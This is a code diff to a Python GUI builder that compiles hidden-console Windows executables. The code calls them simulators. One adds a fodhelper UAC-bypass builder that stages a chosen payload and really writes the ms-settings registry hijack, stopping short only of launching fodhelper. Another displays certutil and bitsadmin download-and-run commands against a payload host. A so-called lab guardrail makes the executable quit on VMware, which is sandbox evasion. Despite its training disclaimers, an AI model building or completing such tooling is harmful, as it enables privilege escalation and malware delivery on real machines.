@@ -885,6 +885,261 @@ if __name__ == "__main__":
             shutil.rmtree(temp_dir, ignore_errors=True)
 
 
+class LogicUACBypass:
+    """Simulates MITRE ATT&CK T1548.002 – Bypass UAC via fodhelper registry hijack.
+
+    Generates a compiled exe that, when run in the lab:
+      1. Writes the payload path into HKCU\\...\\ms-settings\\shell\\open\\command
+      2. Launches fodhelper.exe, which reads the hijacked handler and would
+         execute the payload with high-integrity (simulated – actually just
+         reports what would happen)
+      3. Displays a detailed simulation report popup
+      4. Optionally removes the registry key (cleanup mode)
+    """
+
+    @staticmethod
+    def build(payload_path, output_name, output_dir,
+              enable_vm, enable_cleanup, log_widget):
+        sys.stdout = IORedirector(log_widget)
+        sys.stderr = IORedirector(log_widget)
+        print("[INFO] Starting UAC Bypass Simulator Build...")
+        print("[INFO] Technique: MITRE ATT&CK T1548.002 - Bypass UAC via fodhelper")
+
+        payload_name = os.path.basename(payload_path)
+        vm_code = VM_CHECK_CODE if enable_vm else ""
+        vm_call = (
+            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
+            if enable_vm else ""
+        )
+        cleanup = (
+            """\
+    # --- CLEANUP: remove the hijacked handler key ---
+    _uac_key = r"Software\\Classes\\ms-settings\\shell\\open\\command"
+    try:
+        import winreg as _wr
+        _wr.DeleteKey(_wr.HKEY_CURRENT_USER, _uac_key + "\\\\DelegateExecute")
+    except Exception:
+        pass
+    try:
+        import winreg as _wr
+        with _wr.OpenKey(_wr.HKEY_CURRENT_USER, _uac_key, 0, _wr.KEY_WRITE) as _hk:
+            _wr.DeleteValue(_hk, "")
+        _wr.DeleteKey(_wr.HKEY_CURRENT_USER, _uac_key)
+        lines.append("[CLEANUP] Hijacked handler key removed.")
+    except Exception as _exc:
+        lines.append("[CLEANUP ERROR] " + str(_exc))
+"""
+            if enable_cleanup else ""
+        )
+
+        script_content = f"""import os, sys, shutil, tempfile, platform, subprocess
+import tkinter as tk
+from tkinter import messagebox
+{vm_code}
+PAYLOAD_FILENAME = "{payload_name}"
+
+# Registry key used by the fodhelper UAC bypass technique
+_UAC_REG_KEY       = r"Software\\Classes\\ms-settings\\shell\\open\\command"
+_UAC_DELEGATE_KEY  = r"Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute"
+
+def _res(p):
+    try:
+        return os.path.join(sys._MEIPASS, p)
+    except AttributeError:
+        return os.path.join(os.path.abspath("."), p)
+
+def _report(body):
+    root = tk.Tk()
+    root.withdraw()
+    messagebox.showinfo("Sim -- T1548.002 UAC Bypass", body)
+    root.destroy()
+
+def run_simulation():
+{vm_call}
+    if platform.system() != "Windows":
+        _report("[ERROR] Windows-only simulation.")
+        return
+
+    import winreg
+    lines = [
+        "[SIM] UAC Bypass Simulator (fodhelper registry hijack)",
+        "[SIM] Technique: MITRE ATT&CK T1548.002",
+        "-" * 60,
+    ]
+    dest_dir = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()), "SimLab")
+    os.makedirs(dest_dir, exist_ok=True)
+    dest_payload = os.path.join(dest_dir, PAYLOAD_FILENAME)
+    try:
+        shutil.copy2(_res(PAYLOAD_FILENAME), dest_payload)
+        lines.append("[STEP 1] Payload staged: " + dest_payload)
+    except Exception as _e:
+        lines.append("[ERROR] Stage failed: " + str(_e))
+        dest_payload = _res(PAYLOAD_FILENAME)
+
+    # Step 2: Write hijacked handler into HKCU ms-settings\\shell\\open\\command
+    try:
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, _UAC_REG_KEY) as _hk:
+            winreg.SetValueEx(_hk, "", 0, winreg.REG_SZ, dest_payload)
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, _UAC_DELEGATE_KEY) as _hk2:
+            winreg.SetValueEx(_hk2, "", 0, winreg.REG_SZ, "")
+        lines.append("[STEP 2] Hijacked handler written:")
+        lines.append("  HKCU\\\\" + _UAC_REG_KEY)
+        lines.append("  Default value -> " + dest_payload)
+        lines.append("  DelegateExecute key created (required for bypass)")
+    except Exception as _e:
+        lines.append("[ERROR] Registry write failed: " + str(_e))
+
+    # Step 3: Show what launching fodhelper would do (do NOT actually launch it)
+    fodhelper_path = r"C:\\Windows\\System32\\fodhelper.exe"
+    lines.append("[STEP 3] fodhelper.exe path: " + fodhelper_path)
+    lines.append("[NOTE] In a real bypass, launching fodhelper.exe would")
+    lines.append("       auto-elevate and execute the handler as high-integrity.")
+    lines.append("[SIM]  Actual execution is skipped – this is a simulation only.")
+{cleanup}
+    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")
+
+if __name__ == "__main__":
+    run_simulation()
+"""
+        temp_dir = tempfile.mkdtemp()
+        script_path = os.path.join(temp_dir, "uac_bypass_sim.py")
+        try:
+            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
+            with open(script_path, 'w', encoding='utf-8') as fh:
+                fh.write(script_content)
+            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
+            base_name  = os.path.splitext(final_name)[0]
+            sep = ';' if sys.platform.startswith('win') else ':'
+            cmd = [
+                'pyinstaller', '--onefile', '--noconsole',
+                '--name', base_name,
+                '--add-data', payload_name + sep + '.',
+                script_path,
+            ]
+            print("[INFO] Compiling...")
+            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
+            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
+            final_dest = os.path.join(output_dir, final_name)
+            shutil.move(dist_exe, final_dest)
+            print(f"[SUCCESS] Simulator created: {final_dest}")
+            messagebox.showinfo("Success", f"Created: {final_dest}")
+        except Exception as e:
+            print(f"[ERROR] {e}")
+            messagebox.showerror("Error", str(e))
+        finally:
+            shutil.rmtree(temp_dir, ignore_errors=True)
+
+
+class LogicCmdDropper:
+    """Simulates MITRE ATT&CK T1059.003 – Windows Command Shell dropper.
+
+    Generates a compiled exe that, when run in the lab:
+      1. Builds a cmd.exe command using certutil -urlcache -f to download
+         the payload (a common living-off-the-land technique)
+      2. Displays a detailed simulation report popup showing the exact
+         cmd.exe command that would be executed
+      3. Does NOT actually connect to the network or execute certutil
+         (safe simulation)
+    """
+
+    @staticmethod
+    def build(url, download_path, filename, delay_start,
+              output_name, output_dir, enable_vm, log_widget):
+        sys.stdout = IORedirector(log_widget)
+        sys.stderr = IORedirector(log_widget)
+        print("[INFO] Starting CMD Dropper Simulator Build...")
+        print("[INFO] Technique: MITRE ATT&CK T1059.003 - Windows Command Shell")
+
+        vm_code = VM_CHECK_CODE if enable_vm else ""
+        vm_call = (
+            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
+            if enable_vm else ""
+        )
+        # Escape backslashes so the path is valid inside a regular Python
+        # string literal in the generated script (raw strings can't end with \)
+        escaped_path = download_path.replace("\\", "\\\\")
+
+        script_content = f"""import os, sys, platform, tempfile
+import tkinter as tk
+from tkinter import messagebox
+{vm_code}
+TARGET_URL    = "{url}"
+DEST_DIR      = "{escaped_path}"
+FILENAME      = "{filename}"
+DELAY_START   = {delay_start}
+
+def _report(body):
+    root = tk.Tk()
+    root.withdraw()
+    messagebox.showinfo("Sim -- T1059.003 CMD Dropper", body)
+    root.destroy()
+
+def run_simulation():
+{vm_call}
+    if platform.system() != "Windows":
+        _report("[ERROR] Windows-only simulation.")
+        return
+    lines = [
+        "[SIM] Windows CMD Shell Dropper Simulator",
+        "[SIM] Technique: MITRE ATT&CK T1059.003",
+        "-" * 60,
+    ]
+    dest_path = os.path.join(DEST_DIR if os.path.isabs(DEST_DIR)
+                             else os.path.join(os.environ.get("USERPROFILE", ""), DEST_DIR),
+                             FILENAME)
+    # Certutil living-off-the-land download command
+    certutil_cmd = (
+        f"certutil -urlcache -split -f {{TARGET_URL}} {{dest_path}}"
+    )
+    # Alternative: bitsadmin (also commonly abused)
+    bitsadmin_cmd = (
+        f'bitsadmin /transfer SimJob /download /priority normal '
+        f'{{TARGET_URL}} {{dest_path}}'
+    )
+    lines.append(f"[STEP 1] Delay: {{DELAY_START}}s (simulated)")
+    lines.append(f"[STEP 2] Target download path: {{dest_path}}")
+    lines.append("")
+    lines.append("[METHOD A] certutil (T1140 / LOLBAS):")
+    lines.append("  " + certutil_cmd)
+    lines.append("")
+    lines.append("[METHOD B] bitsadmin (T1197 / LOLBAS):")
+    lines.append("  " + bitsadmin_cmd)
+    lines.append("")
+    lines.append("[STEP 3] After download, exec via:")
+    lines.append(f"  cmd.exe /c start {{dest_path}}")
+    lines.append("[NOTE] None of the above commands were actually executed.")
+    lines.append("[SIM]  This is a display-only simulation of the technique.")
+    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")
+
+if __name__ == "__main__":
+    run_simulation()
+"""
+        temp_dir = tempfile.mkdtemp()
+        script_path = os.path.join(temp_dir, "cmd_dropper_sim.py")
+        try:
+            with open(script_path, 'w', encoding='utf-8') as fh:
+                fh.write(script_content)
+            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
+            base_name  = os.path.splitext(final_name)[0]
+            cmd = [
+                'pyinstaller', '--onefile', '--noconsole',
+                '--name', base_name,
+                script_path,
+            ]
+            print("[INFO] Compiling...")
+            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
+            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
+            final_dest = os.path.join(output_dir, final_name)
+            shutil.move(dist_exe, final_dest)
+            print(f"[SUCCESS] Simulator created: {final_dest}")
+            messagebox.showinfo("Success", f"Created: {final_dest}")
+        except Exception as e:
+            print(f"[ERROR] {e}")
+            messagebox.showerror("Error", str(e))
+        finally:
+            shutil.rmtree(temp_dir, ignore_errors=True)
+
+
 # =============================================================================
 # MAIN GUI APPLICATION
 # =============================================================================
@@ -911,6 +1166,8 @@ class UnifiedBuilderApp(tk.Tk):
         self.init_reg_persist_tab()
         self.init_schtask_tab()
         self.init_startup_tab()
+        self.init_uac_bypass_tab()
+        self.init_cmd_dropper_tab()
 
     def _configure_styles(self):
         self.style.configure('.', background='#1A1A1A', foreground='#22C55E')
@@ -1210,6 +1467,85 @@ class UnifiedBuilderApp(tk.Tk):
             target=LogicStartupFolder.build,
             args=(self.sf_payload.get(), self.sf_name.get(), self.sf_dir.get(),
                   self.sf_vm.get(), self.sf_cleanup.get(), self.sf_log)
+        ).start()
+
+    # --- TAB 8: UAC BYPASS SIMULATOR ---
+    def init_uac_bypass_tab(self):
+        tab = ttk.Frame(self.notebook, padding=20)
+        self.notebook.add(tab, text="UAC Bypass")
+
+        ttk.Label(tab, text="UAC Bypass Sim (fodhelper hijack)", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
+        ttk.Label(tab, text="Technique: MITRE ATT&CK T1548.002 - Bypass UAC via fodhelper registry hijack",
+                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
+
+        self.ub_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
+        self.ub_name    = self.add_label_entry(tab, "Output Name:", "UACBypassSim.exe")
+        self.ub_dir     = self.add_file_selector(tab, "Output Dir:", True)
+
+        self.ub_vm      = tk.BooleanVar(value=False)
+        self.ub_cleanup = tk.BooleanVar(value=True)
+        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.ub_vm).pack(anchor='w', pady=3)
+        ttk.Checkbutton(tab, text="Enable Cleanup (remove registry key after simulation)", variable=self.ub_cleanup).pack(anchor='w', pady=3)
+
+        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_uac_bypass).pack(fill='x', pady=10)
+        self.ub_log = self.create_log_area(tab)
+
+    def run_uac_bypass(self):
+        if not all([self.ub_payload.get(), self.ub_name.get(), self.ub_dir.get()]):
+            messagebox.showerror("Error", "Fill all fields.")
+            return
+        self.ub_log.delete(1.0, tk.END)
+        threading.Thread(
+            target=LogicUACBypass.build,
+            args=(self.ub_payload.get(), self.ub_name.get(), self.ub_dir.get(),
+                  self.ub_vm.get(), self.ub_cleanup.get(), self.ub_log)
+        ).start()
+
+    # --- TAB 9: CMD DROPPER SIMULATOR ---
+    def init_cmd_dropper_tab(self):
+        tab = ttk.Frame(self.notebook, padding=20)
+        self.notebook.add(tab, text="CMD Dropper")
+
+        ttk.Label(tab, text="CMD Shell Dropper Sim (certutil/bitsadmin)", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
+        ttk.Label(tab, text="Technique: MITRE ATT&CK T1059.003 - Windows Command Shell (LOLBAS)",
+                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
+
+        self.cd_url    = self.add_label_entry(tab, "Source URL:", "http://192.168.1.100:8000/payload.exe")
+        self.cd_path   = self.add_label_entry(tab, "Download Dir:", "Downloads\\")
+        self.cd_fname  = self.add_label_entry(tab, "Filename:", "update.exe")
+
+        f_delay = ttk.Frame(tab)
+        f_delay.pack(fill='x', pady=5)
+        ttk.Label(f_delay, text="Delay Start (s):").pack(side=tk.LEFT)
+        self.cd_delay = ttk.Entry(f_delay, width=5)
+        self.cd_delay.insert(0, "3")
+        self.cd_delay.pack(side=tk.LEFT, padx=5)
+
+        self.cd_name   = self.add_label_entry(tab, "Output Name:", "CmdDropperSim.exe")
+        self.cd_dir    = self.add_file_selector(tab, "Output Dir:", True)
+
+        self.cd_vm = tk.BooleanVar(value=False)
+        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.cd_vm).pack(anchor='w', pady=5)
+
+        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_cmd_dropper).pack(fill='x', pady=10)
+        self.cd_log = self.create_log_area(tab)
+
+    def run_cmd_dropper(self):
+        if not all([self.cd_url.get(), self.cd_path.get(), self.cd_fname.get(),
+                    self.cd_name.get(), self.cd_dir.get()]):
+            messagebox.showerror("Error", "Fill all fields.")
+            return
+        try:
+            delay = int(self.cd_delay.get())
+        except ValueError:
+            messagebox.showerror("Error", "Delay must be an integer.")
+            return
+        self.cd_log.delete(1.0, tk.END)
+        threading.Thread(
+            target=LogicCmdDropper.build,
+            args=(self.cd_url.get(), self.cd_path.get(), self.cd_fname.get(),
+                  delay, self.cd_name.get(), self.cd_dir.get(),
+                  self.cd_vm.get(), self.cd_log)
         ).start()
 
 if __name__ == "__main__":
